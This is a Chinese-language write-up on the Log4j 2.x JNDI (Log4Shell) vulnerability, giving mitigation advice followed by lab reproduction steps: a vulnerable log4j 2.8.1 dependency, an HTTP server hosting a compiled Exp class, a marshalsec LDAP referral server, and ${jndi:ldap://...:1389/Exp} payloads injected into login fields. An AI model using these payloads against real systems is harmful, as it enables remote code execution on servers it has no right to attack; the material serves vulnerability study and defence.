漏洞的核心问题在于 Log4j 2.x 中的 JNDI 查找机制，它允许在日志消息中使用 `${}` 占位符来引用远程 JNDI 资源。攻击者可以构造一个包含恶意 JNDI 资源引用的日志消息，当应用程序尝试处理这个消息时，就会触发远程代码执行。这个问题影响了许多应用程序，尤其是那些使用默认配置并且处理用户提供的日志消息的应用程序。

针对这个漏洞，一些应对措施和建议包括：

- **升级到修复版本**：Apache Log4j 团队迅速发布了修复版本来解决这个问题。如果您的应用程序使用 Log4j，请尽快升级到受影响版本的修复版本。

- **过滤恶意输入**：如果您无法立即升级到修复版本，您可以考虑在应用程序中实施输入过滤，以防止恶意的日志消息触发漏洞。

- **配置安全策略**：您可以通过配置安全策略来限制应用程序访问 JNDI 资源。这有助于减少远程代码执行的风险。

- **检查应用程序依赖**：检查您的应用程序是否使用 Log4j，并确定所使用的版本。这可以帮助您确定是否受到漏洞的影响。

- **监控和响应**：监控您的应用程序日志，以便在发现异常活动时能够及时采取行动。

请注意，随着时间的推移，漏洞情况可能会发生变化，所以始终建议查阅官方安全公告和可靠的安全资源以获取最新信息和指导。

环境`pom.xml`添加依赖
```
<dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.8.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.8.1</version>
        </dependency>
```

大致步骤  
1. 将Exp.java文件进行编译为Exp.class  
2. 在Exp.class同级目录python起一个服务,
```
python3 -m http.server 1234 
```
3. 先下载好marshalsec，进入文件夹，运行以下命令
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:1234/#Exp
```
4.用postman测试， post请求 参数添加 ${jndi:ldap://127.0.0.1:1389/Exp}  
例如：  
```
{
    "user": "${jndi:ldap://192.168.1.105:1389/Exp}",
    "password": "${jndi:ldap://192.168.1.105:1389/Exp}"
}
```
